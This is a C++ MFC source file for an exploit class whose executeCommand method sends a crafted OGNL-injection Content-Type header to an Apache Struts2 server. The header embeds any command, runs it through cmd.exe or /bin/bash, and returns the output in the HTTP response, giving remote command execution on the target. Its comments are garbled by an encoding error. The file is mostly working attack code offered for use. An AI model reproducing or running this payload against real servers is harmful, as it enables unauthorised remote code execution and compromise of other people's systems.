#include "stdafx.h"
#include "Exp.h"
#include <winsock2.h>
#include<atlbase.h>
#include<atlconv.h>
#include <stdio.h>
#include <afxinet.h>

Exp::Exp(void)
{
}


Exp::~Exp(void)
{
}

CString Exp::executeCommand(CString url,CString command)
{
	CString urlHost = ""; //����
	CString urlPath = ""; //·��
	CString contextTypeStr = "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
		+ command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
	CString postData = "";
	CString resultPage;

	/* URL���� */
	CString urlPrefix = "http://"; //URLǰ׺
	CString urlSeparator = "/"; //URL�ָ���
	int urlPrefixPos = url.Find(urlPrefix); //���ҵ�һ��ǰ׺λ��
	if(urlPrefixPos >= 0) //����ǰ׺
		url = url.Mid(urlPrefixPos+urlPrefix.GetLength()); //ȥ��ǰ׺
	int urlSeparatorPos = url.Find(urlSeparator); //���ҵ�һ���ָ���λ��
	if(urlSeparatorPos >= 0) //���ڷָ���
	{
		urlHost = url.Mid(0,urlSeparatorPos); //ȡ������
		urlPath = url.Mid(urlSeparatorPos); //ȡ·�� �����ָ���
	}

	try
	{
		CInternetSession httpSession;
		httpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,15000); //��ʱʱ��
		httpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// ���Լ��ʱ��	
		httpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//���Դ���
		CHttpConnection* HttpConnection = httpSession.GetHttpConnection(urlHost);
		CHttpFile* httpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,urlPath,NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
		CString header = contextTypeStr;
		httpFile->SendRequest(header,header.GetLength(),(LPVOID)((LPCTSTR)postData),postData.GetLength());
		DWORD statusCode;	//HTTP״̬��
		httpFile->QueryInfoStatusCode(statusCode);
		if(statusCode != 200) 
		{
			return false;
		}
		char readBuff[4096]={0};
		int readNum = 0;
		while((readNum = httpFile->Read((void*)readBuff,4095))>0)
		{
			readBuff[readNum] = '\0';
			resultPage += readBuff;
			memset(readBuff,0,4096);
		}
	}
	catch(CInternetException* e)
	{
	}
	return resultPage;
}
